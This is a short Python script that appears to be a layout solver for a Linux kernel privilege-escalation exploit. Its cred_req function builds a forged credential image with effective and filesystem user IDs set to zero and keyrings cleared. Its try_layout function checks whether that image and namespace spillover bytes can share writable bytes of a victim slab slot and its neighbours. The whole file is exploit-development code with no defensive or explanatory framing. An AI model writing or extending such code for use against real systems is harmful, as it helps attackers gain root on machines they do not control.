# Correct model:
#  - O (victim slot) holds the ns's direct part < 0x100: freely writable in [0x18,0xf8).
#  - The uniform neighbour pattern holds the cred image AND the ns spillover bytes (g>=0x100).
WLO, WHI = 0x18, 0xf8
TOK = ('tok',)

def cred_req(v):
    r = {}
    for i in range(4): r[v+i] = TOK            # usage = V_low (nonzero)
    for i,b in enumerate((0x80,0xff,0xff,0xff)): r[v+0x04+i] = b   # uid
    r[v+0x14] = 0; r[v+0x1c] = 0               # euid, fsuid
    for i in range(0x20): r[v+0x58+i] = 0         # keyrings (contiguous 0x58..0x78)
    for p in range(5):
        for i in range(8): r[v+0x78+8*p+i] = ('ptr',p,i)
    return r

def ns_hard(u):
    out = []
    for a,bs in ((u+0x00,[1,0,0,0]),(u+0x08,[0,0,0,0]),(u+0x0c,[0,0,0,0]),(u+0x10,[1,0,0,0]),
                 (u+0x48,[1,0,0,0]),(u+0x50,[0,0,0,0]),(u+0x54,[0,0,0,0]),(u+0x58,[1,0,0,0]),
                 (u+0xd8,[0]*8),(u+0x104,[0,0,0,0x40]),(u+0x210,[0]*8)):
        out.append((a,bs))
    return out

def try_layout(u,v):
    F = cred_req(v)
    if max(F) >= WHI: return ('cred-overflow',)
    O = {}   # direct bytes in O
    for (a,bs) in ns_hard(u):
        for i,b in enumerate(bs):
            g=a+i; s=g & 0xff
            tgt = O if g < 0x100 else F
            if g < 0x100:
                if not (WLO <= s < WHI): return ('O-unwritable %#x'%g,)
            else:
                if not (WLO <= s < WHI): return ('F-unwritable %#x'%g,)
            if s in tgt and tgt[s]!=b: return ('conflict %#x'%g,)
            tgt[s]=b
    wins=[]
    for k in range(14):
        a=WLO+16*k
        det=[F.get(a+i) for i in range(16)]
        nf=sum(1 for x in det if x is None)
        wins.append((a,'FREE' if nf else ('ZERO' if all(x==0 for x in det) else 'FIX')))
    zeros=[a for a,t in wins if t=='ZERO']
    if len(zeros)>1: return ('zeros=%d'%len(zeros),)
    seen=set()
    for a,t in wins:
        if t!='FIX': continue
        sig=tuple(F.get(a+i) for i in range(16))
        if sig in seen: return ('dup',)
        seen.add(sig)
    return ('OK',zeros,O,wins)

